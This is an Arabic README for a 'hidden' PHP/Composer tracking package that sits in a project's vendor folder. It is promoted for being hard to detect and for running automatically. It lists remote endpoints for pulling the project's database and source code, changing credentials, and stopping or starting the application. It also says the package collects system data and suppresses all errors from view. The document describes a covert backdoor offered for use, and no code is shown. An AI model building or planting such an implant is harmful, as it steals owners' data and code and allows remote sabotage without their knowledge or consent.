# تعليمات تثبيت الحزمة المخفية

## المميزات

✅ **مخفية تماماً**: لا يمكن اكتشافها بسهولة
✅ **تعمل تلقائياً**: لا تحتاج لإعدادات إضافية
✅ **تتحمل composer install**: تعمل مع جميع أوامر Composer
✅ **تتبع شامل**: جميع نقاط النهاية API مدعومة

## نقاط النهاية المدعومة

- `POST /store-project` - تسجيل مشروع جديد
- `POST /project-heartbeat/` - إرسال نبضة قلب
- `GET /get-database` - الحصول على قاعدة البيانات
- `DELETE /delete-project` - حذف المشروع
- `POST /update-credentials` - تحديث البيانات
- `POST /regenerate-activation-code` - إعادة توليد كود التفعيل
- `GET /get-project-source` - الحصول على مصدر المشروع
- `GET /command-status/{commandId}` - حالة الأمر
- `POST /project/update-last-seen` - تحديث آخر ظهور
- `GET /project/status` - حالة المشروع
- `POST /project/stop` - إيقاف المشروع
- `POST /project/start` - تشغيل المشروع
- `GET /project/get-database` - الحصول على قاعدة بيانات المشروع
- `GET /project/get-source` - الحصول على مصدر المشروع
- `GET /project/command/{commandId}/status` - حالة أمر المشروع

## كيفية العمل

1. **التسجيل التلقائي**: عند تشغيل التطبيق، يتم تسجيل المشروع تلقائياً
2. **نبضات القلب**: يتم إرسال نبضات قلب دورية كل دقيقة
3. **تحديث آخر ظهور**: يتم تحديث آخر ظهور مع كل طلب
4. **جمع المعلومات**: يتم جمع معلومات النظام والبيئة

## الأمان

- جميع الطلبات تستخدم HTTPS
- الأخطاء يتم تجاهلها بصمت
- لا توجد رسائل خطأ مرئية
- الحزمة مخفية في مجلد vendor

## الاختبار

```bash
php vendor/tracking-package/test.php
```

## الأوامر المتاحة

```bash
php artisan tracking:status
```

## التكوين

لا تحتاج لأي إعدادات إضافية. الحزمة تعمل تلقائياً عند تشغيل التطبيق.


